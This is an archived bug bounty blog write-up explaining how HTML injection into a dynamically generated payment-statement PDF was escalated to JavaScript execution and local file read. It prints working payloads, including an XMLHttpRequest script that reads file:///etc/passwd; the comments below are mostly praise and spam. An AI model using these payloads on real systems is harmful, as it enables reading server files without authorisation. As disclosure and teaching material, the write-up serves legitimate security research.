---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2017-11-08_local-file-read-via-xss-in-dynamically-generated-pdf.md
original_filename: 2017-11-08_local-file-read-via-xss-in-dynamically-generated-pdf.md
title: Local File Read via XSS in Dynamically Generated PDF
category: documents
detected_topics:
- xss
- ssrf
- command-injection
- path-traversal
- api-security
- cloud-security
tags:
- imported
- documents
- xss
- ssrf
- command-injection
- path-traversal
- api-security
- cloud-security
language: en
raw_sha256: 9d4ebd9e87db40173251b7090680e1cc3f541e00c7ec2b58d7e588a5ceba7ca1
text_sha256: afc1be0c78649036953222e124652d30d10d9fe59fcbf14c59c38bbbbe9493e9
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: false
---

# Local File Read via XSS in Dynamically Generated PDF

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2017-11-08_local-file-read-via-xss-in-dynamically-generated-pdf.md
- Source Type: markdown
- Detected Topics: xss, ssrf, command-injection, path-traversal, api-security, cloud-security
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: False
- Raw SHA256: `9d4ebd9e87db40173251b7090680e1cc3f541e00c7ec2b58d7e588a5ceba7ca1`
- Text SHA256: `afc1be0c78649036953222e124652d30d10d9fe59fcbf14c59c38bbbbe9493e9`


## Content

---
title: "Local File Read via XSS in Dynamically Generated PDF"
url: "http://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html"
final_url: "https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html"
authors: ["Rahul Maini (@iamnoooob)"]
bugs: ["XSS", "LFI"]
publication_date: "2017-11-08"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6058
---

Share 

  * Get link
  * Facebook
  * X
  * Pinterest
  * Email
  * Other Apps

[ November 08, 2017  ](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html "permanent link")

###  Local File Read via XSS in Dynamically Generated PDF 

# REDIRECTING TO THE NEW BLOG ... 

Hello Hunters,  
This time I am writing about a Vulnerability found in another private program(xyz.com) on Bugcrowd which at first I thought wasn't much harmful(P4) but later escalated it to a P1.  
  
While browsing the Application I came across an endpoint which allowed us to download some kind of Payment Statements as PDF.  
  
The URL looked like this  
  
https://xyz.com/payments/downloadStatements?Id=b9bc3d&utrnumber=xyz&date=2017-08-11&settlement_type=all&advice_id=undefined  
  
I saw that the Value of utr number is reflected inside the PDF file that got downloaded so I wrote some HTML in **utrnumber** parameter as **" ><S>aaa **  
  
https://xyz.com/payments/downloadStatements?Id=b9bc3d&**utrnumber** =**" ><S>aaa **&date=2017-08-11&settlement_type=all&advice_id=undefined  
  
Upon opening this PDF I found that the HTML was rendered and could be seen in PDF. This kind of vulnerability usually leads to XSS but this time it was inside a PDF which was being generated dynamically.  
If you want to learn more about XSS then I advise to checkout this great intro on XSS: <https://www.aptive.co.uk/blog/xss-cross-site-scripting/>  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7VodlIxskfhxs_IAhV5gn-pKxLSR8ExxXjeCIKQKBuXBJz7rBE-8VVVhq-2C0xTrUyifVnznfyaRkXYtIaYx62sPPSpRbcklCXmOBczGIzAAqIkJybxBTle-4GIzY2JQLchOts8xNCA5J/s1600/Screenshot+from+2017-11-08+14-29-18.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7VodlIxskfhxs_IAhV5gn-pKxLSR8ExxXjeCIKQKBuXBJz7rBE-8VVVhq-2C0xTrUyifVnznfyaRkXYtIaYx62sPPSpRbcklCXmOBczGIzAAqIkJybxBTle-4GIzY2JQLchOts8xNCA5J/s1600/Screenshot+from+2017-11-08+14-29-18.png)

  
I tried if I could use an iframe and load internal domains in the frame or if I could iframe file:///etc/passwd but none of the tricks worked! also, I wasn't able to iframe external domains.  
  
https://xyz.com/payments/downloadStatements?Id=b9bc3d&**utrnumber** =**" ><iframe src="http://localhost"></iframe>**&date=2017-08-11&settlement_type=all&advice_id=undefined  

  

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiuNWfSvkfbvBSlBILzgxMI5sHeUyrQiZh8mGb6SIw5iItdOVJ-KjuipTKE57T9SpHpA2MIh9avSs0qQTCBBuMLoG1mGWHnCOTLBtGQ-Krus4X5pm2c6oMRXi1UnfFVKUJzzpsBgvWYc2zd/s1600/Screenshot+from+2017-11-08+14-33-13.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiuNWfSvkfbvBSlBILzgxMI5sHeUyrQiZh8mGb6SIw5iItdOVJ-KjuipTKE57T9SpHpA2MIh9avSs0qQTCBBuMLoG1mGWHnCOTLBtGQ-Krus4X5pm2c6oMRXi1UnfFVKUJzzpsBgvWYc2zd/s1600/Screenshot+from+2017-11-08+14-33-13.png)

But, from now I didn't know if I could go further because I wasn't sure if javascript could be executed like this in PDF.So after playing around a lot I found that we could execute javascript with the help of DOM Manipulation  
  
**< p id="test">aa</p><script>document.getElementById('test').innerHTML+='aa'</script> **  
  
https://xyz.com/payments/downloadStatements?Id=b9bc3d&**utrnumber** =**< p id="test">aa</p><script>document.getElementById('test').innerHTML+='aa'</script>**&date=2017-08-11&settlement_type=all&advice_id=undefined  

  

and Upon downloading PDF I found that it contained the "aaaa" :D  
  
also sometime later, I found that I could also use document.write() function to show results more easily.  
  
**< img src=x onerror=document.write('aaaa')>**  

  

https://xyz.com/payments/downloadStatements?Id=b9bc3d&**utrnumber** =**< img src=x onerror=document.write('aaaa')>**&date=2017-08-11&settlement_type=all&advice_id=undefined  

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEim44RscquFzQ42O3Pu-qD2c2PRYlkaxKLUteTDklwTHsoKzwAhJu18nNCXQfzj7cYveS4cMqN47JjHHoeOZL3vyEnZmwLTXpcru5121pEM3SrIBK77mhmzPOcT2xUZeEiz6b-fdXRFN7UI/s1600/Screenshot+from+2017-11-08+14-53-58.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEim44RscquFzQ42O3Pu-qD2c2PRYlkaxKLUteTDklwTHsoKzwAhJu18nNCXQfzj7cYveS4cMqN47JjHHoeOZL3vyEnZmwLTXpcru5121pEM3SrIBK77mhmzPOcT2xUZeEiz6b-fdXRFN7UI/s1600/Screenshot+from+2017-11-08+14-53-58.png)

after this I checked the **window.location** of where this javascript is executed and to my surprise it was executing in file:// origin on the Server

  

https://xyz.com/payments/downloadStatements?Id=b9bc3d&**utrnumber** =**< img src=x onerror=document.write('aaaa'%2bwindow.location)>**&date=2017-08-11&settlement_type=all&advice_id=undefined

  

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjdgXFqIsuqvFETJdLVMTGvdW2Ae7qyHkIgzh8AkUXoz5EX2jH8PH46Vt-Q_URKUabl9w5VUTFfnEcH_3NvsUqmTd1dNybbhE2ycw2jrz8BX_vgMiwphp3cIBEBj-5wZGndK-BHkqMxYht7/s1600/Screenshot+from+2017-11-08+14-56-39.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjdgXFqIsuqvFETJdLVMTGvdW2Ae7qyHkIgzh8AkUXoz5EX2jH8PH46Vt-Q_URKUabl9w5VUTFfnEcH_3NvsUqmTd1dNybbhE2ycw2jrz8BX_vgMiwphp3cIBEBj-5wZGndK-BHkqMxYht7/s1600/Screenshot+from+2017-11-08+14-56-39.png)

Now since its executing on file://, I tried if we could access file:///etc/passwd via XHR(XMLHttpRequest), I wasn't sure myself.

  

**< script>**

**x=new XMLHttpRequest;**

**x.onload=function(){**

**document.write(this.responseText)**

**};**

**x.open("GET","file:///etc/passwd");**

**x.send();**

**< /script> **

  

  

https://xyz.com/payments/downloadStatements?Id=b9bc3d&utrnumber=**< script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>**&date=2017-08-11&settlement_type=all&advice_id=undefined  
  
and then you know ;) 

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEizhZcBvjXYUtvbYRfQ7S8Z2-mBLePc5wReLYaeeqLc_wv_PthCBSZQpdEG5j5vnl5d1SiFfEagzkBtgGGN8lLD1PKigFInjQN334AcwIQCk2kPYX7xfoO-LXuS9oqjmyzl2OOZxOs5wvHc/s1600/Screenshot+from+2017-11-08+15-01-54.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEizhZcBvjXYUtvbYRfQ7S8Z2-mBLePc5wReLYaeeqLc_wv_PthCBSZQpdEG5j5vnl5d1SiFfEagzkBtgGGN8lLD1PKigFInjQN334AcwIQCk2kPYX7xfoO-LXuS9oqjmyzl2OOZxOs5wvHc/s1600/Screenshot+from+2017-11-08+15-01-54.png)

  

  

so That was it, XSS in Server Side Generated PDFs to Local File Read! 

  

However, it took :P me some time to figure this You could see the number of PDFs I had to download: 

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjIllxqtZL1f9TrM-Wct_7gkMpaxKf9-T8IeagitPih44yuMuNdx9xhqhkJV2uRcn-4lcKz0vYu135lgGsIjjq7bGbzOGSV3WuKbPDjBwDlOqVznL9JNuu4aogmz09DBxMopkD7QU4knJ6T/s1600/Screenshot+from+2017-11-08+15-03-53.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjIllxqtZL1f9TrM-Wct_7gkMpaxKf9-T8IeagitPih44yuMuNdx9xhqhkJV2uRcn-4lcKz0vYu135lgGsIjjq7bGbzOGSV3WuKbPDjBwDlOqVznL9JNuu4aogmz09DBxMopkD7QU4knJ6T/s1600/Screenshot+from+2017-11-08+15-03-53.png)

  

  

  

./peace  
Rahul Maini  
  
  

Share 

  * Get link
  * Facebook
  * X
  * Pinterest
  * Email
  * Other Apps

### Comments

  1. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[Unknown](https://www.blogger.com/profile/07251099285075481856)[8 November 2017 at 04:32](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html?showComment=1510144371137#c4548421229430543169)

bhai kaise <3 

Reply[Delete](https://www.blogger.com/comment/delete/7318948769938379972/4548421229430543169)

Replies

Reply

  2. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[Aryan Rupala](https://www.blogger.com/profile/05414157737951725154)[8 November 2017 at 08:40](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html?showComment=1510159216477#c1446555259865808843)

Great Find!  

Reply[Delete](https://www.blogger.com/comment/delete/7318948769938379972/1446555259865808843)

Replies

Reply

  3. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[intx0x80](https://www.blogger.com/profile/06870105569133267086)[8 November 2017 at 12:40](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html?showComment=1510173642854#c7561609514340401363)

Nice shot 

Reply[Delete](https://www.blogger.com/comment/delete/7318948769938379972/7561609514340401363)

Replies

Reply

  4. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[muthu](https://www.blogger.com/profile/05390460207325812158)[9 November 2017 at 01:42](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html?showComment=1510220521993#c5218683932958333533)

Nice Bro.. :)  

Reply[Delete](https://www.blogger.com/comment/delete/7318948769938379972/5218683932958333533)

Replies

Reply

  5. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[Harsh Jaiswal](https://www.blogger.com/profile/08776236330051817758)[14 November 2017 at 04:47](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html?showComment=1510663644351#c7738115879599888757)

Very nice Bro :) 

Reply[Delete](https://www.blogger.com/comment/delete/7318948769938379972/7738115879599888757)

Replies

Reply

  6. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[Rohan](https://www.blogger.com/profile/08142762899561835062)[15 November 2017 at 04:26](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html?showComment=1510748792963#c383167092485887008)

Nicely done!

Reply[Delete](https://www.blogger.com/comment/delete/7318948769938379972/383167092485887008)

Replies

Reply

  7. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[nashasmed](https://www.blogger.com/profile/12601535835482618380)[29 November 2017 at 09:14](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html?showComment=1511975667609#c1867027960105596168)

Nice, I use this today in an engagement. Awesome finding  

Reply[Delete](https://www.blogger.com/comment/delete/7318948769938379972/1867027960105596168)

Replies

  1. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[nashasmed](https://www.blogger.com/profile/12601535835482618380)[29 November 2017 at 09:15](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html?showComment=1511975720119#c5389120296473014416)

Does this lead to probably ssrf too?

[Delete](https://www.blogger.com/comment/delete/7318948769938379972/5389120296473014416)

Replies

Reply

  2. ![](//blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhGuCRWtgiPgPzqjrv0ch-N_XzMvx7BNeC-AYJnHRYtWnmFyQ0oWbXvw9OW0-micCFCqcPrrlcBcq4HZCF0qfV8jxIUEBxkhuA6RgVH8oT77AD5eizVZLMaI8sOoY2mRAc/s45-c/%2522%3E%3CS%3Eaaa.jpg)

[Rahul Maini](https://www.blogger.com/profile/17114709543478485243)[29 November 2017 at 10:48](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html?showComment=1511981316377#c6021656772373652677)

Thanks :) Actually yea it leads to a SSRF but since it was executing under file:/// , and I don't may be thats why I wasn't able to load/iframe any of the http:// origin but should work in other cases like you might check this awesome blogpost by @bbuerhaus https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/

[Delete](https://www.blogger.com/comment/delete/7318948769938379972/6021656772373652677)

Replies

Reply

  3. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[Unknown](https://www.blogger.com/profile/02163296753521351094)[16 January 2018 at 01:08](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html?showComment=1516093705007#c3142328315968835780)

hi  
i found same case and there is ssrf and server downloads file from my http server. But problem is that i am not able to exploit LFI

[Delete](https://www.blogger.com/comment/delete/7318948769938379972/3142328315968835780)

Replies

Reply

Reply

  8. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[Unknown](https://www.blogger.com/profile/00009769292400758565)[18 March 2018 at 02:29](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html?showComment=1521365367808#c6103816780395550886)

need ur help can i contact u 

Reply[Delete](https://www.blogger.com/comment/delete/7318948769938379972/6103816780395550886)

Replies

Reply

  9. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[dghdh](https://www.blogger.com/profile/09974984829980327609)[2 May 2018 at 08:15](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html?showComment=1525274124406#c793862835801084180)

Great find! 

Reply[Delete](https://www.blogger.com/comment/delete/7318948769938379972/793862835801084180)

Replies

Reply

  10. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[Sadiq West](https://www.blogger.com/profile/11720899006098451119)[20 January 2019 at 23:56](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html?showComment=1548057375232#c3917600113957899836)

Great finding

Reply[Delete](https://www.blogger.com/comment/delete/7318948769938379972/3917600113957899836)

Replies

Reply

  11. ![](//1.bp.blogspot.com/-0IIAAOb3zAU/ZvkUBH2hf8I/AAAAAAAAEEQ/EL0WUzOhtmo1ni1k9Fh8r2jDRLMG7mXeACK4BGAYYCw/s35/images%252520%25281%2529.jpeg)

[Nino Nurmadi , S.Kom](https://www.blogger.com/profile/17766387116621849642)[25 June 2019 at 04:05](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html?showComment=1561460737137#c2105671790045926990)

[Sharp](https://servicecentersharp.blogspot.com/)  
[Advan](https://servicecenteradvan.blogspot.com/)  
[Metro](https://meteroe.blogspot.com/)  
[Lampung](https://beritalampungselatan.blogspot.com/)  
[Panasonic](https://servicecenterpanasonic.blogspot.com/)  
[pulsa](https://agenpulsabandarlampung.blogspot.com/)  
[lampung](https://kursusservishplampung.blogspot.com/)  
[Lampung](https://lampungketik.blogspot.com/)  
[Lampung](https://applelampung.blogspot.com/)  

Reply[Delete](https://www.blogger.com/comment/delete/7318948769938379972/2105671790045926990)

Replies

Reply

  12. ![](//blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjj7w-H-TjakYRPYP-9pfJyxWqquKHTvUkZ7QbroThrPnBbrB_vS4ycRXnfIwoJyeLHtk4y0N90LLoANDHnM16p8DdXo1tl2ubGB9QkbIO5TQ1bSAH62MyndEn7Ld29Qg/s45-c/IMG_20191001_163315_140.jpg)

[All Information](https://www.blogger.com/profile/02247288905709626321)[29 September 2019 at 21:39](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html?showComment=1569818391152#c2611884280274520689)

Nice article  
**[airtel recharge list](https://www.all-information.in/2019/08/airtel-recharge-list.html "Airtel recharge list")**  

Reply[Delete](https://www.blogger.com/comment/delete/7318948769938379972/2611884280274520689)

Replies

Reply

  13. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[Brandon William](https://www.blogger.com/profile/17496494287955307029)[22 January 2020 at 10:58](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html?showComment=1579719522308#c4295088931286919854)

The person merely uploads the picture that they need transformed and the net picture converter renders the picture and makes it accessible for obtain. Like all picture vectorizer applications, they range in high quality, pace, options and price. If you want to learn more about this topic please visit [onlineconvertfree.com](https://onlineconvertfree.com/compress-image/)

Reply[Delete](https://www.blogger.com/comment/delete/7318948769938379972/4295088931286919854)

Replies

Reply

  14. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[Unknown](https://www.blogger.com/profile/03959315285835147095)[3 June 2020 at 21:39](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html?showComment=1591245586057#c7442286540150802134)

here from HTB, thanks a lot!

Reply[Delete](https://www.blogger.com/comment/delete/7318948769938379972/7442286540150802134)

Replies

Reply

  15. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[egyption](https://www.blogger.com/profile/13884117592633376590)[5 June 2020 at 13:55](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html?showComment=1591390536925#c3389509407891713033)

i need the pdf file  

Reply[Delete](https://www.blogger.com/comment/delete/7318948769938379972/3389509407891713033)

Replies

Reply

  16. ![](//blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEimUnt9Zk-_X1lTnPyGW9qRjRtXIYXMACUkvAcOQTEaGevxsJHBRIwCpTRZKOBcMYG1Y3CEQJubgcmacQYZk6sdmhqhKn8Tn3qchhelDa_qfG075aP3ZdVJi1e8bwW7JQ/s45-c/skofos.jpeg)

[Skofos](https://www.blogger.com/profile/08962834507816626909)[11 July 2020 at 01:17](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html?showComment=1594455458727#c389882806042997683)

This comment has been removed by the author.

Reply[Delete](https://www.blogger.com/comment/delete/7318948769938379972/389882806042997683)

Replies

Reply

  17. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[bugbountyhuntingonline](https://www.blogger.com/profile/17621628807457329886)[14 October 2020 at 01:15](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html?showComment=1602663352525#c8856837173182547894)

j.aadithya techusa is #1: vapt services in usa https://www.algotradeusa.com/  

Reply[Delete](https://www.blogger.com/comment/delete/7318948769938379972/8856837173182547894)

Replies

Reply

  18. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[Lorriel Sims](https://www.blogger.com/profile/01767440192936658723)[1 February 2021 at 07:52](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html?showComment=1612194727642#c2340950106374751388)

Cross-site scripting attacks, often abbreviated as XSS, are a type of attack in <http://casitabuilderlasvegas.com/>

Reply[Delete](https://www.blogger.com/comment/delete/7318948769938379972/2340950106374751388)

Replies

Reply

  19. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[Huongkv](https://www.blogger.com/profile/09167457771171306382)[28 February 2021 at 23:06](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html?showComment=1614582409097#c3662188411857607009)

Đặt vé máy bay tại đại lý Aivivu, tham khảo  
  
[Ve may bay di My](https://aivivu.com/ve-may-bay-di-my-us-gia-re-bao-nhieu-tien/)  
  
[mua vé máy bay từ mỹ về vn](https://aivivu.com/ve-may-bay-tu-my-ve-viet-nam-gia-re/)  
  
[giá vé máy bay đà nẵng đi nha trang](https://aivivu.com/ve-may-bay-di-nha-trang-cxr-bao-nhieu-tien/)  
  
[bảng giá vé máy bay đi phú quốc ](https://aivivu.com/ve-may-bay-di-phu-quoc-pqc-bao-nhieu-tien/)  
  
[vé máy bay đi Huế pacific airline](https://aivivu.com/ve-may-bay-di-hue-hui-bao-nhieu-tien/)  

Reply[Delete](https://www.blogger.com/comment/delete/7318948769938379972/3662188411857607009)

Replies

Reply

  20. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[technology](https://www.blogger.com/profile/18348521218869382728)[22 March 2021 at 05:55](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html?showComment=1616417703299#c828025230558216488)

A self-hosted WordPress site gives you the opportunity to earn more and become a successful Internet marketer. Take the first step today by getting a beginner WordPress course. [best course to learn R programming](https://medium.com/javarevisited/10-best-r-programming-courses-for-data-science-and-statistics-8f84ebec4974)  

Reply[Delete](https://www.blogger.com/comment/delete/7318948769938379972/828025230558216488)

Replies

Reply

Add comment

Load more...

#### Post a Comment

[](https://www.blogger.com/comment/frame/7318948769938379972?po=1507365432699616259&hl=en-GB&saa=85391&origin=https://www.noob.ninja&skin=soho)

###  Popular Posts 

[ ![Image](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjpq7T6NEGtyWoMgnvs7L25o-mLyL88mzN4pvOCWypUTXilmswVMwXer09Cj7fUmKI9cxk_sSq0rL9iOyk1VupB3xKNvEEOmDMXjp4Hz36AVIfpm40WNUSgbQui2roRNZcRAcbBeovaf89m/s1600/Screenshot_118.png) ](https://www.noob.ninja/2019/12/spilling-local-files-via-xxe-when-http.html)

[ December 07, 2019  ](https://www.noob.ninja/2019/12/spilling-local-files-via-xxe-when-http.html "permanent link")

### [Spilling Local Files via XXE When HTTP OOB Fails](https://www.noob.ninja/2019/12/spilling-local-files-via-xxe-when-http.html)

Share 

  * Get link
  * Facebook
  * X
  * Pinterest
  * Email
  * Other Apps

[ 3 comments ](https://www.noob.ninja/2019/12/spilling-local-files-via-xxe-when-http.html#comments)
